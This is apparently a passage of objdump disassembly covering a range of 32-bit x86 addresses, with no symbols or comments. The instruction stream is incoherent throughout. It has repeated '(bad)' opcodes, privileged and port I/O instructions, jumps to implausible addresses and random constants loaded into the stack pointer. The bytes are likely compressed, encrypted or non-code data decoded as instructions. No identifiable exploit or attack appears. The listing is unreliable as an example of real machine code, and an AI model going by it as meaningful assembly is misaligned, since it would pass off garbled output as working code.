  4333dc:	5d                   	pop    %ebp
  4333dd:	38 f4                	cmp    %dh,%ah
  4333df:	2c 8e                	sub    $0x8e,%al
  4333e1:	5a                   	pop    %edx
  4333e2:	3a fd                	cmp    %ch,%bh
  4333e4:	22 34 62             	and    (%edx,%eiz,2),%dh
  4333e7:	07                   	pop    %es
  4333e8:	0a cd                	or     %ch,%cl
  4333ea:	80 8e 7f 31 65 56 91 	orb    $0x91,0x5665317f(%esi)
  4333f1:	bf d5 11 9a f9       	mov    $0xf99a11d5,%edi
  4333f6:	1c 22                	sbb    $0x22,%al
  4333f8:	61                   	popa
  4333f9:	48                   	dec    %eax
  4333fa:	ad                   	lods   %ds:(%esi),%eax
  4333fb:	3d 03 72 c5 f0       	cmp    $0xf0c57203,%eax
  433400:	e1 04                	loope  0x433406
  433402:	e1 f2                	loope  0x4333f6
  433404:	f7 a7 60 c0 45 af    	mull   -0x50ba3fa0(%edi)
  43340a:	16                   	push   %ss
  43340b:	8f                   	(bad)
  43340c:	59                   	pop    %ecx
  43340d:	c6 82 1e 73 77 cb ae 	movb   $0xae,-0x34888ce2(%edx)
  433414:	bc 53 de 32 77       	mov    $0x7732de53,%esp
  433419:	c9                   	leave
  43341a:	3d c3 ae 9b ce       	cmp    $0xce9baec3,%eax
  43341f:	70 9f                	jo     0x4333c0
  433421:	46                   	inc    %esi
  433422:	e3 19                	jecxz  0x43343d
  433424:	ec                   	in     (%dx),%al
  433425:	ce                   	into
  433426:	24 1f                	and    $0x1f,%al
  433428:	e2 6a                	loop   0x433494
  43342a:	d1 3c 7c             	sarl   $1,(%esp,%edi,2)
  43342d:	cf                   	iret
  43342e:	44                   	inc    %esp
  43342f:	19 44 39 ce          	sbb    %eax,-0x32(%ecx,%edi,1)
  433433:	a0 0d a3 42 23       	mov    0x2342a30d,%al
  433438:	3b b5 63 43 2d 68    	cmp    0x682d4363(%ebp),%esi
  43343e:	e0 ed                	loopne 0x43342d
  433440:	57                   	push   %edi
  433441:	01 47 e3             	add    %eax,-0x1d(%edi)
  433444:	0e                   	push   %cs
  433445:	96                   	xchg   %eax,%esi
  433446:	bc bd 07 8b da       	mov    $0xda8b07bd,%esp
  43344b:	f1                   	int1
  43344c:	a3 0d 9c d8 fe       	mov    %eax,0xfed89c0d
  433451:	1c cd                	sbb    $0xcd,%al
  433453:	78 98                	js     0x4333ed
  433455:	4c                   	dec    %esp
  433456:	89 a9 06 eb a2 44    	mov    %ebp,0x44a2eb06(%ecx)
  43345c:	66 33 c5             	xor    %bp,%ax
  43345f:	9c                   	pushf
  433460:	7c cd                	jl     0x43342f
  433462:	3b 83 5e 4c 71 a3    	cmp    -0x5c8eb3a2(%ebx),%eax
  433468:	e6 a8                	out    %al,$0xa8
  43346a:	96                   	xchg   %eax,%esi
  43346b:	5f                   	pop    %edi
  43346c:	4c                   	dec    %esp
  43346d:	00 7d 9e             	add    %bh,-0x62(%ebp)
  433470:	2d 74 5d de 73       	sub    $0x73de5d74,%eax
  433475:	2f                   	das
  433476:	32 43 79             	xor    0x79(%ebx),%al
  433479:	b9 76 14 71 c4       	mov    $0xc4711476,%ecx
  43347e:	77 cb                	ja     0x43344b
  433480:	c9                   	leave
  433481:	9e                   	sahf
  433482:	89 5e 76             	mov    %ebx,0x76(%esi)
  433485:	d8 25 af d4 5e 44    	fsubs  0x445ed4af
  43348b:	4d                   	dec    %ebp
  43348c:	88 b0 6b 9b 83 97    	mov    %dh,-0x687c6495(%eax)
  433492:	bb e9 ac cc 15       	mov    $0x15ccace9,%ebx
  433497:	70 ca                	jo     0x433463
  433499:	14 b9                	adc    $0xb9,%al
  43349b:	e7 01                	out    %eax,$0x1
  43349d:	be 65 5e 68 9c       	mov    $0x9c685e65,%esi
  4334a2:	05 3a a0 54 78       	add    $0x7854a03a,%eax
  4334a7:	1c df                	sbb    $0xdf,%al
  4334a9:	ab                   	stos   %eax,%es:(%edi)
  4334aa:	54                   	push   %esp
  4334ab:	7a 49                	jp     0x4334f6
  4334ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4334ae:	b3 82                	mov    $0x82,%bl
  4334b0:	8c 83 7f d2 d7 22    	mov    %es,0x22d7d27f(%ebx)
  4334b6:	24 a6                	and    $0xa6,%al
  4334b8:	93                   	xchg   %eax,%ebx
  4334b9:	dd 10                	fstl   (%eax)
  4334bb:	2b 1e                	sub    (%esi),%ebx
  4334bd:	87 63 fa             	xchg   %esp,-0x6(%ebx)
  4334c0:	2b ca                	sub    %edx,%ecx
  4334c2:	34 30                	xor    $0x30,%al
  4334c4:	dc 64 64 e4          	fsubl  -0x1c(%esp,%eiz,2)
  4334c8:	df fa                	(bad)
  4334ca:	a1 b1 e4 b2 93       	mov    0x93b2e4b1,%eax
  4334cf:	c3                   	ret
  4334d0:	b5 86                	mov    $0x86,%ch
  4334d2:	16                   	push   %ss
  4334d3:	c3                   	ret
  4334d4:	31 6d 66             	xor    %ebp,0x66(%ebp)
  4334d7:	65 2d 89 f3 6a 89    	gs sub $0x896af389,%eax
  4334dd:	dd ec                	fucomp %st(4)
  4334df:	a0 66 ef 6f 92       	mov    0x926fef66,%al
  4334e4:	20 1c 69             	and    %bl,(%ecx,%ebp,2)
  4334e7:	85 86 ab 30 3a 42    	test   %eax,0x423a30ab(%esi)
  4334ed:	34 7e                	xor    $0x7e,%al
  4334ef:	7b ac                	jnp    0x43349d
  4334f1:	ed                   	in     (%dx),%eax
  4334f2:	80 c6 5b             	add    $0x5b,%dh
  4334f5:	e2 89                	loop   0x433480
  4334f7:	79 8c                	jns    0x433485
  4334f9:	6b 08 74             	imul   $0x74,(%eax),%ecx
  4334fc:	12 86 df 1c 51 bf    	adc    -0x40aee321(%esi),%al
  433502:	10 74 b6 dd          	adc    %dh,-0x23(%esi,%esi,4)
  433506:	70 d6                	jo     0x4334de
  433508:	51                   	push   %ecx
  433509:	39 d9                	cmp    %ebx,%ecx
  43350b:	1b 17                	sbb    (%edi),%edx
  43350d:	ca d1 af             	lret   $0xafd1
  433510:	71 c8                	jno    0x4334da
  433512:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433513:	ba a5 50 c8 bf       	mov    $0xbfc850a5,%edx
  433518:	6a a1                	push   $0xffffffa1
  43351a:	1b 0b                	sbb    (%ebx),%ecx
  43351c:	25 5f 28 a2 c8       	and    $0xc8a2285f,%eax
  433521:	2f                   	das
  433522:	cc                   	int3
  433523:	d1 76 fa             	shll   $1,-0x6(%esi)
  433526:	8b 0d c7 f1 d2 8d    	mov    0x8dd2f1c7,%ecx
  43352c:	9f                   	lahf
  43352d:	01 64 6b c1          	add    %esp,-0x3f(%ebx,%ebp,2)
  433531:	04 d4                	add    $0xd4,%al
  433533:	da f7                	(bad)
  433535:	ef                   	out    %eax,(%dx)
  433536:	4c                   	dec    %esp
  433537:	c0 6c 75 27 6b       	shrb   $0x6b,0x27(%ebp,%esi,2)
  43353c:	4e                   	dec    %esi
  43353d:	85 b2 d9 19 48 a3    	test   %esi,-0x5cb7e627(%edx)
  433543:	b1 9f                	mov    $0x9f,%cl
  433545:	b9 17 8d 17 27       	mov    $0x27178d17,%ecx
  43354a:	6d                   	insl   (%dx),%es:(%edi)
  43354b:	c1 07 30             	roll   $0x30,(%edi)
  43354e:	ee                   	out    %al,(%dx)
  43354f:	98                   	cwtl
  433550:	77 a1                	ja     0x4334f3
  433552:	67 87 ea             	addr16 xchg %ebp,%edx
  433555:	e8 b5 1d cb 0b       	call   0xc0e530f
  43355a:	9e                   	sahf
  43355b:	42                   	inc    %edx
  43355c:	ca 25 d5             	lret   $0xd525
  43355f:	f3 d7                	repz xlat %ds:(%ebx)
  433561:	f8                   	clc
  433562:	7a 9f                	jp     0x433503
  433564:	75 fd                	jne    0x433563
  433566:	10 01                	adc    %al,(%ecx)
  433568:	cd 08                	int    $0x8
  43356a:	06                   	push   %es
  43356b:	6c                   	insb   (%dx),%es:(%edi)
  43356c:	04 7c                	add    $0x7c,%al
  43356e:	4f                   	dec    %edi
  43356f:	25 db ab 46 bf       	and    $0xbf46abdb,%eax
  433574:	af                   	scas   %es:(%edi),%eax
  433575:	38 b0 fe 72 81 d2    	cmp    %dh,-0x2d7e8d02(%eax)
  43357b:	9b                   	fwait
  43357c:	3c 8e                	cmp    $0x8e,%al
  43357e:	58                   	pop    %eax
  43357f:	21 ab 22 fc 04 42    	and    %ebp,0x4204fc22(%ebx)
  433585:	84 c4                	test   %al,%ah
  433587:	10 0d f0 d1 75 41    	adc    %cl,0x4175d1f0
  43358d:	0f 1c 2c 81          	nopl   (%ecx,%eax,4)
  433591:	cb                   	lret
  433592:	b8 c0 04 53 4d       	mov    $0x4d5304c0,%eax
  433597:	64 a8 82             	fs test $0x82,%al
  43359a:	44                   	inc    %esp
  43359b:	29 a2 2f 38 f9 e4    	sub    %esp,-0x1b06c7d1(%edx)
  4335a1:	40                   	inc    %eax
  4335a2:	a0 98 89 57 03       	mov    0x3578998,%al
  4335a7:	26 b0 c3             	es mov $0xc3,%al
  4335aa:	82 1e 6d             	sbbb   $0x6d,(%esi)
  4335ad:	3b fb                	cmp    %ebx,%edi
  4335af:	52                   	push   %edx
  4335b0:	3e 36 74 cf          	ds je,pt 0x433583
  4335b4:	e3 ac                	jecxz  0x433562
  4335b6:	c9                   	leave
  4335b7:	66 a2 ba 39 9f ac    	data16 mov %al,0xac9f39ba
  4335bd:	9b                   	fwait
  4335be:	ac                   	lods   %ds:(%esi),%al
  4335bf:	f1                   	int1
  4335c0:	10 60 01             	adc    %ah,0x1(%eax)
  4335c3:	c0 50 d2 97          	rclb   $0x97,-0x2e(%eax)
  4335c7:	49                   	dec    %ecx
  4335c8:	11 61 ab             	adc    %esp,-0x55(%ecx)
  4335cb:	a3 53 8d 3f 72       	mov    %eax,0x723f8d53
  4335d0:	bf f1 d0 05 74       	mov    $0x7405d0f1,%edi
  4335d5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4335d6:	bf 36 7d 13 2f       	mov    $0x2f137d36,%edi
  4335db:	5d                   	pop    %ebp
  4335dc:	78 0e                	js     0x4335ec
  4335de:	5b                   	pop    %ebx
  4335df:	a9 39 9a 54 68       	test   $0x68549a39,%eax
  4335e4:	07                   	pop    %es
  4335e5:	6d                   	insl   (%dx),%es:(%edi)
  4335e6:	7a ea                	jp     0x4335d2
  4335e8:	8f                   	(bad)
  4335e9:	0d a4 62 ff ca       	or     $0xcaff62a4,%eax
  4335ee:	01 cd                	add    %ecx,%ebp
  4335f0:	02 43 62             	add    0x62(%ebx),%al
  4335f3:	84 39                	test   %bh,(%ecx)
  4335f5:	4b                   	dec    %ebx
  4335f6:	58                   	pop    %eax
  4335f7:	c2 50 e5             	ret    $0xe550
  4335fa:	e3 19                	jecxz  0x433615
  4335fc:	ec                   	in     (%dx),%al
  4335fd:	2f                   	das
  4335fe:	d2 c6                	rol    %cl,%dh
  433600:	fb                   	sti
  433601:	f1                   	int1
  433602:	85 6b c3             	test   %ebp,-0x3d(%ebx)
  433605:	57                   	push   %edi
  433606:	73 02                	jae    0x43360a
  433608:	e2 bc                	loop   0x4335c6
  43360a:	33 93 16 e9 52 80    	xor    -0x7fad16ea(%ebx),%edx
  433610:	ab                   	stos   %eax,%es:(%edi)
  433611:	48                   	dec    %eax
  433612:	f9                   	stc
  433613:	bd 5c 8f 2d 67       	mov    $0x672d8f5c,%ebp
  433618:	ff ac 57 79 13 65 08 	ljmp   *0x8651379(%edi,%edx,2)
  43361f:	ca 78 2c             	lret   $0x2c78
  433622:	cf                   	iret
  433623:	e0 4c                	loopne 0x433671
  433625:	36 d9 6d c5          	fldcw  %ss:-0x3b(%ebp)
  433629:	c0 0f e2             	rorb   $0xe2,(%edi)
  43362c:	a1 4a 8b 2b e5       	mov    0xe52b8b4a,%eax
  433631:	49                   	dec    %ecx
  433632:	17                   	pop    %ss
  433633:	51                   	push   %ecx
  433634:	c8 60 fd 8c          	enter  $0xfd60,$0x8c
  433638:	ce                   	into
  433639:	74 c5                	je     0x433600
  43363b:	be df 50 e8 c6       	mov    $0xc6e850df,%esi
  433640:	ef                   	out    %eax,(%dx)
  433641:	25 f2 14 ab 1c       	and    $0x1cab14f2,%eax
  433646:	18 49 70             	sbb    %cl,0x70(%ecx)
  433649:	3e 20 f1             	ds and %dh,%cl
  43364c:	75 d0                	jne    0x43361e
  43364e:	38 43 0a             	cmp    %al,0xa(%ebx)
  433651:	f0 9b                	lock fwait
  433653:	15 46 9d 2e ff       	adc    $0xff2e9d46,%eax
  433658:	11 21                	adc    %esp,(%ecx)
  43365a:	e8 62 d3 83 6b       	call   0x6bc709c1
  43365f:	3b 44 80 a1          	cmp    -0x5f(%eax,%eax,4),%eax
  433663:	b9 16 92 21 d2       	mov    $0xd2219216,%ecx
  433668:	95                   	xchg   %eax,%ebp
  433669:	9f                   	lahf
  43366a:	f4                   	hlt
  43366b:	00 ec                	add    %ch,%ah
  43366d:	8a 91 d7 59 13 b1    	mov    -0x4eeca629(%ecx),%dl
  433673:	ae                   	scas   %es:(%edi),%al
  433674:	cd 67                	int    $0x67
  433676:	b5 c1                	mov    $0xc1,%ch
  433678:	86 41 45             	xchg   %al,0x45(%ecx)
  43367b:	96                   	xchg   %eax,%esi
  43367c:	55                   	push   %ebp
  43367d:	3c 61                	cmp    $0x61,%al
  43367f:	59                   	pop    %ecx
  433680:	e0 53                	loopne 0x4336d5
  433682:	36 1e                	ss push %ds
  433684:	7f 27                	jg     0x4336ad
  433686:	a9 ac 35 12 4a       	test   $0x4a1235ac,%eax
  43368b:	17                   	pop    %ss
  43368c:	9e                   	sahf
  43368d:	56                   	push   %esi
  43368e:	23 07                	and    (%edi),%eax
  433690:	db d3                	fcmovnbe %st(3),%st
  433692:	15 75 13 f2 61       	adc    $0x61f21375,%eax
  433697:	c7 40 22 60 10 c8 3f 	movl   $0x3fc81060,0x22(%eax)
  43369e:	ab                   	stos   %eax,%es:(%edi)
  43369f:	9f                   	lahf
  4336a0:	a0 30 ca d0 08       	mov    0x8d0ca30,%al
  4336a5:	65 28 19             	sub    %bl,%gs:(%ecx)
  4336a8:	30 81 24 c5 e9 f2    	xor    %al,-0xd163adc(%ecx)
  4336ae:	63 18                	arpl   %ebx,(%eax)
  4336b0:	bd 31 b4 a9 99       	mov    $0x99a9b431,%ebp
  4336b5:	89 34 95 09 36 d5 7a 	mov    %esi,0x7ad53609(,%edx,4)
  4336bc:	8c ba a2 5e a7 dd    	mov    %?,-0x2258a15e(%edx)
  4336c2:	42                   	inc    %edx
  4336c3:	40                   	inc    %eax
  4336c4:	3b fe                	cmp    %esi,%edi
  4336c6:	49                   	dec    %ecx
  4336c7:	22 5d 35             	and    0x35(%ebp),%bl
  4336ca:	49                   	dec    %ecx
  4336cb:	18 eb                	sbb    %ch,%bl
  4336cd:	60                   	pusha
  4336ce:	3c 3f                	cmp    $0x3f,%al
  4336d0:	65 e7 cb             	gs out %eax,$0xcb
  4336d3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4336d4:	57                   	push   %edi
  4336d5:	e9 7f 08 ae 96       	jmp    0x96f13f59
  4336da:	2e 77 ba             	ja,pn  0x433697
  4336dd:	4e                   	dec    %esi
  4336de:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4336df:	8d 5b 52             	lea    0x52(%ebx),%ebx
  4336e2:	ff                   	(bad)
  4336e3:	39 5e fa             	cmp    %ebx,-0x6(%esi)
  4336e6:	5d                   	pop    %ebp
  4336e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4336e8:	ed                   	in     (%dx),%eax
  4336e9:	c4                   	(bad)
  4336ea:	ff 4c 6d ba          	decl   -0x46(%ebp,%ebp,2)
  4336ee:	b3 4b                	mov    $0x4b,%bl
  4336f0:	1a 16                	sbb    (%esi),%dl
  4336f2:	24 fc                	and    $0xfc,%al
  4336f4:	cf                   	iret
  4336f5:	f9                   	stc
  4336f6:	ba b0 3f b0 0c       	mov    $0xcb03fb0,%edx
  4336fb:	92                   	xchg   %eax,%edx
  4336fc:	cd 1f                	int    $0x1f
  4336fe:	5e                   	pop    %esi
  4336ff:	05 05 88 a3 db       	add    $0xdba38805,%eax
  433704:	2e ef                	cs out %eax,(%dx)
  433706:	de 52 4f             	ficoms 0x4f(%edx)
  433709:	25 12 a2 1b 67       	and    $0x671ba212,%eax
  43370e:	c7                   	(bad)
  43370f:	de fa                	fdivrp %st,%st(2)
  433711:	57                   	push   %edi
  433712:	5a                   	pop    %edx
  433713:	ec                   	in     (%dx),%al
  433714:	56                   	push   %esi
  433715:	37                   	aaa
  433716:	77 e3                	ja     0x4336fb
  433718:	fe                   	(bad)
  433719:	5c                   	pop    %esp
  43371a:	11 e7                	adc    %esp,%edi
  43371c:	b8 99 66 c0 e0       	mov    $0xe0c06699,%eax
  433721:	80 6a 96 fe          	subb   $0xfe,-0x6a(%edx)
  433725:	6a 40                	push   $0x40
  433727:	cd 24                	int    $0x24
  433729:	8a 52 14             	mov    0x14(%edx),%dl
  43372c:	e5 e2                	in     $0xe2,%eax
  43372e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43372f:	0c 73                	or     $0x73,%al
  433731:	cc                   	int3
  433732:	87 4e 5e             	xchg   %ecx,0x5e(%esi)
  433735:	c4 7a 4b             	les    0x4b(%edx),%edi
  433738:	8d 0f                	lea    (%edi),%ecx
  43373a:	eb 44                	jmp    0x433780
  43373c:	29 a2 db c2 eb ad    	sub    %esp,-0x52143d25(%edx)
  433742:	15 7c 4c 68 a0       	adc    $0xa0684c7c,%eax
  433747:	4f                   	dec    %edi
  433748:	a1 6b ca c3 6d       	mov    0x6dc3ca6b,%eax
  43374d:	2c 56                	sub    $0x56,%al
  43374f:	b7 31                	mov    $0x31,%bh
  433751:	c4                   	(bad)
  433752:	dd 3a                	fnstsw (%edx)
  433754:	7c 9d                	jl     0x4336f3
  433756:	bd 49 9a 7d 95       	mov    $0x957d9a49,%ebp
  43375b:	54                   	push   %esp
  43375c:	9d                   	popf
  43375d:	41                   	inc    %ecx
  43375e:	54                   	push   %esp
  43375f:	d1 67 c7             	shll   $1,-0x39(%edi)
  433762:	d7                   	xlat   %ds:(%ebx)
  433763:	5a                   	pop    %edx
  433764:	21 58 5b             	and    %ebx,0x5b(%eax)
  433767:	46                   	inc    %esi
  433768:	9a 92 4b 84 77 16 84 	lcall  $0x8416,$0x77844b92
  43376f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  433770:	5e                   	pop    %esi
  433771:	e3 57                	jecxz  0x4337ca
  433773:	32 98 01 12 ca fa    	xor    -0x535edff(%eax),%bl
  433779:	e4 1e                	in     $0x1e,%al
  43377b:	90                   	nop
  43377c:	0e                   	push   %cs
  43377d:	a2 00 b1 c5 07       	mov    %al,0x7c5b100
  433782:	eb f1                	jmp    0x433775
  433784:	e9 8d 9d dc 63       	jmp    0x641fd516
  433789:	c8 9b 76 dd          	enter  $0x769b,$0xdd
  43378d:	b5 ce                	mov    $0xce,%ch
  43378f:	71 d4                	jno    0x433765
  433791:	30 d7                	xor    %dl,%bh
  433793:	6e                   	outsb  %ds:(%esi),(%dx)
  433794:	d8 d5                	fcom   %st(5)
  433796:	77 2a                	ja     0x4337c2
  433798:	33 e9                	xor    %ecx,%ebp
  43379a:	7b de                	jnp    0x43377a
  43379c:	96                   	xchg   %eax,%esi
  43379d:	5b                   	pop    %ebx
  43379e:	a8 36                	test   $0x36,%al
  4337a0:	9e                   	sahf
  4337a1:	3c 53                	cmp    $0x53,%al
  4337a3:	3b b9 76 1a 56 53    	cmp    0x53561a76(%ecx),%edi
  4337a9:	ac                   	lods   %ds:(%esi),%al
  4337aa:	24 17                	and    $0x17,%al
  4337ac:	72 8c                	jb     0x43373a
  4337ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4337af:	2d 95 6c 20 a4       	sub    $0xa4206c95,%eax
  4337b4:	b5 82                	mov    $0x82,%ch
  4337b6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4337b7:	98                   	cwtl
  4337b8:	a0 33 a1 74 80       	mov    0x8074a133,%al
  4337bd:	b3 0e                	mov    $0xe,%bl
  4337bf:	f1                   	int1
  4337c0:	38 a9 4e df e4 ce    	cmp    %ch,-0x311b20b2(%ecx)
  4337c6:	4d                   	dec    %ebp
  4337c7:	3d 0d 4b 8d 30       	cmp    $0x308d4b0d,%eax
  4337cc:	61                   	popa
  4337cd:	35 dd d0 50 86       	xor    $0x8650d0dd,%eax
  4337d2:	c0 63 0e a4          	shlb   $0xa4,0xe(%ebx)
  4337d6:	6a 84                	push   $0xffffff84
  4337d8:	f9                   	stc
  4337d9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4337da:	c6                   	(bad)
  4337db:	93                   	xchg   %eax,%ebx
  4337dc:	f1                   	int1
  4337dd:	2a 89 94 c4 f6 eb    	sub    -0x14093b6c(%ecx),%cl
  4337e3:	ff d1                	call   *%ecx
  4337e5:	80 bc 00 58 83 40 e5 	cmpb   $0x71,-0x1abf7ca8(%eax,%eax,1)
  4337ec:	71 
  4337ed:	d5 c4                	aad    $0xc4
  4337ef:	f9                   	stc
  4337f0:	40                   	inc    %eax
  4337f1:	3e 2c bd             	ds sub $0xbd,%al
  4337f4:	31 43 04             	xor    %eax,0x4(%ebx)
  4337f7:	69 3b 1a 25 06 d4    	imul   $0xd406251a,(%ebx),%edi
  4337fd:	29 5d f3             	sub    %ebx,-0xd(%ebp)
  433800:	b2 6f                	mov    $0x6f,%dl
  433802:	29 2c 6a             	sub    %ebp,(%edx,%ebp,2)
  433805:	7c 0b                	jl     0x433812
  433807:	9c                   	pushf
  433808:	78 af                	js     0x4337b9
  43380a:	ce                   	into
  43380b:	03 97 a1 2e d7 fb    	add    -0x428d15f(%edi),%edx
  433811:	49                   	dec    %ecx
  433812:	84 61 79             	test   %ah,0x79(%ecx)
  433815:	11 c1                	adc    %eax,%ecx
  433817:	40                   	inc    %eax
  433818:	fe                   	(bad)
  433819:	15 3e 6e 41 2d       	adc    $0x2d416e3e,%eax
  43381e:	eb f7                	jmp    0x433817
  433820:	de fc                	fdivrp %st,%st(4)
  433822:	40                   	inc    %eax
  433823:	49                   	dec    %ecx
  433824:	42                   	inc    %edx
  433825:	f8                   	clc
  433826:	eb 09                	jmp    0x433831
  433828:	73 6d                	jae    0x433897
  43382a:	77 d8                	ja     0x433804
  43382c:	85 47 5d             	test   %eax,0x5d(%edi)
  43382f:	ff 60 8f             	jmp    *-0x71(%eax)
  433832:	16                   	push   %ss
  433833:	7e 6f                	jle    0x4338a4
  433835:	1f                   	pop    %ds
  433836:	03 87 79 88 c7 9b    	add    -0x64387787(%edi),%eax
  43383c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  43383d:	32 cd                	xor    %ch,%cl
  43383f:	4e                   	dec    %esi
  433840:	7f e5                	jg     0x433827
  433842:	ca 05 32             	lret   $0x3205
  433845:	b8 6b 6b 34 4d       	mov    $0x4d346b6b,%eax
  43384a:	3e 9a 2c 8d 6a ef d6 	ds lcall $0x10d6,$0xef6a8d2c
  433851:	10 
  433852:	b0 6c                	mov    $0x6c,%al
  433854:	b5 90                	mov    $0x90,%ch
  433856:	52                   	push   %edx
  433857:	f1                   	int1
  433858:	b7 34                	mov    $0x34,%bh
  43385a:	2e 15 5d fc e2 23    	cs adc $0x23e2fc5d,%eax
  433860:	e7 99                	out    %eax,$0x99
  433862:	fb                   	sti
  433863:	c1 14 07 b6          	rcll   $0xb6,(%edi,%eax,1)
  433867:	1f                   	pop    %ds
  433868:	cf                   	iret
  433869:	7e 26                	jle    0x433891
  43386b:	70 32                	jo     0x43389f
  43386d:	2e a2 e8 be fc f6    	mov    %al,%cs:0xf6fcbee8
  433873:	57                   	push   %edi
  433874:	97                   	xchg   %eax,%edi
  433875:	8a 98 54 7d c5 8f    	mov    -0x703a82ac(%eax),%bl
  43387b:	f9                   	stc
  43387c:	f9                   	stc
  43387d:	78 0a                	js     0x433889
  43387f:	f0 17                	lock pop %ss
  433881:	16                   	push   %ss
  433882:	15 92 d0 2f bf       	adc    $0xbf2fd092,%eax
  433887:	7b ee                	jnp    0x433877
  433889:	42                   	inc    %edx
  43388a:	44                   	inc    %esp
  43388b:	b1 01                	mov    $0x1,%cl
  43388d:	03 0a                	add    (%edx),%ecx
  43388f:	64 a9 db ef 6f a7    	fs test $0xa76fefdb,%eax
  433895:	5a                   	pop    %edx
  433896:	06                   	push   %es
  433897:	e9 ac b0 5e 6c       	jmp    0x6ca1e948
  43389c:	48                   	dec    %eax
  43389d:	ec                   	in     (%dx),%al
  43389e:	02 8d c2 bd 87 16    	add    0x1687bdc2(%ebp),%cl
  4338a4:	65 19 84 da da 0f c8 	sbb    %eax,%gs:-0x3737f026(%edx,%ebx,8)
  4338ab:	c8 
  4338ac:	cd 9e                	int    $0x9e
  4338ae:	31 8f 8d 1b 58 41    	xor    %ecx,0x41581b8d(%edi)
  4338b4:	4a                   	dec    %edx
  4338b5:	6a 7d                	push   $0x7d
  4338b7:	9c                   	pushf
  4338b8:	9a 11 85 1f 2c b9 82 	lcall  $0x82b9,$0x2c1f8511
  4338bf:	ee                   	out    %al,(%dx)
  4338c0:	28 7a bb             	sub    %bh,-0x45(%edx)
  4338c3:	7c 76                	jl     0x43393b
  4338c5:	40                   	inc    %eax
  4338c6:	3f                   	aas
  4338c7:	2c db                	sub    $0xdb,%al
  4338c9:	cf                   	iret
  4338ca:	b5 81                	mov    $0x81,%ch
  4338cc:	a0 41 90 ff 5c       	mov    0x5cff9041,%al
  4338d1:	1e                   	push   %ds
  4338d2:	99                   	cltd
  4338d3:	d3 38                	sarl   %cl,(%eax)
  4338d5:	19 67 d5             	sbb    %esp,-0x2b(%edi)
  4338d8:	e4 3f                	in     $0x3f,%al
  4338da:	60                   	pusha
  4338db:	4e                   	dec    %esi
  4338dc:	c1 1d 61 1f 9a 3d 71 	rcrl   $0x71,0x3d9a1f61
  4338e3:	c4 c7 25 0c          	(bad)
  4338e7:	77 32                	ja     0x43391b
  4338e9:	25 6e d2 c0 df       	and    $0xdfc0d26e,%eax
  4338ee:	52                   	push   %edx
  4338ef:	ec                   	in     (%dx),%al
  4338f0:	71 6b                	jno    0x43395d
  4338f2:	41                   	inc    %ecx
  4338f3:	d3 b5 cd d7 3a c0    	shll   %cl,-0x3fc52833(%ebp)
  4338f9:	ba 58 08 70 20       	mov    $0x20700858,%edx
  4338fe:	f9                   	stc
  4338ff:	bc 9d b5 47 59       	mov    $0x5947b59d,%esp
  433904:	44                   	inc    %esp
  433905:	8a c3                	mov    %bl,%al
  433907:	8c 4e 11             	mov    %cs,0x11(%esi)
  43390a:	e9 ac 25 c3 a0       	jmp    0xa1065ebb
  43390f:	2b 58 f6             	sub    -0xa(%eax),%ebx
  433912:	72 ec                	jb     0x433900
  433914:	fb                   	sti
  433915:	5c                   	pop    %esp
  433916:	be 80 22 71 5d       	mov    $0x5d712280,%esi
  43391b:	c3                   	ret
  43391c:	a9 58 a9 b1 22       	test   $0x22b1a958,%eax
  433921:	7d ee                	jge    0x433911
  433923:	5d                   	pop    %ebp
  433924:	11 b9 5b 75 a9 34    	adc    %edi,0x34a9755b(%ecx)
  43392a:	73 18                	jae    0x433944
  43392c:	e8 d4 ce d7 34       	call   0x351b0805
  433931:	62 e9 11             	(bad) {ru-bad},{%k7}
  433934:	5f                   	pop    %edi
  433935:	5a                   	pop    %edx
  433936:	51                   	push   %ecx
  433937:	1d da 8a b2 5e       	sbb    $0x5eb28ada,%eax
  43393c:	97                   	xchg   %eax,%edi
  43393d:	2f                   	das
  43393e:	29 24 0e             	sub    %esp,(%esi,%ecx,1)
  433941:	49                   	dec    %ecx
  433942:	b5 f1                	mov    $0xf1,%ch
  433944:	a3 b5 09 eb 89       	mov    %eax,0x89eb09b5
  433949:	f3 3d 3b 54 4d 5d    	repz cmp $0x5d4d543b,%eax
  43394f:	56                   	push   %esi
  433950:	3b 07                	cmp    (%edi),%eax
  433952:	74 0b                	je     0x43395f
  433954:	56                   	push   %esi
  433955:	ff                   	(bad)
  433956:	bb a2 6d bc 7e       	mov    $0x7ebc6da2,%ebx
  43395b:	06                   	push   %es
  43395c:	82 64 e1 31 31       	andb   $0x31,0x31(%ecx,%eiz,8)
  433961:	3a 29                	cmp    (%ecx),%ch
  433963:	3e b7 bd             	ds mov $0xbd,%bh
  433966:	b6 d0                	mov    $0xd0,%dh
  433968:	b3 85                	mov    $0x85,%bl
  43396a:	26 98                	es cwtl
  43396c:	3f                   	aas
  43396d:	e2 d5                	loop   0x433944
  43396f:	aa                   	stos   %al,%es:(%edi)
  433970:	f1                   	int1
  433971:	4a                   	dec    %edx
  433972:	9d                   	popf
  433973:	9f                   	lahf
  433974:	6c                   	insb   (%dx),%es:(%edi)
  433975:	a2 37 4e 16 9e       	mov    %al,0x9e164e37
  43397a:	ed                   	in     (%dx),%eax
  43397b:	ed                   	in     (%dx),%eax
  43397c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  43397d:	65 8d a3 4a 47 75 53 	lea    %gs:0x5375474a(%ebx),%esp
  433984:	86 da                	xchg   %bl,%dl
  433986:	6a ef                	push   $0xffffffef
  433988:	25 a4 ec 9c c3       	and    $0xc39ceca4,%eax
  43398d:	5b                   	pop    %ebx
  43398e:	30 64 45 1d          	xor    %ah,0x1d(%ebp,%eax,2)
  433992:	72 02                	jb     0x433996
  433994:	bf 9a 40 27 7d       	mov    $0x7d27409a,%edi
  433999:	40                   	inc    %eax
  43399a:	60                   	pusha
  43399b:	34 e9                	xor    $0xe9,%al
  43399d:	47                   	inc    %edi
  43399e:	fd                   	std
  43399f:	fb                   	sti
  4339a0:	4b                   	dec    %ebx
  4339a1:	37                   	aaa
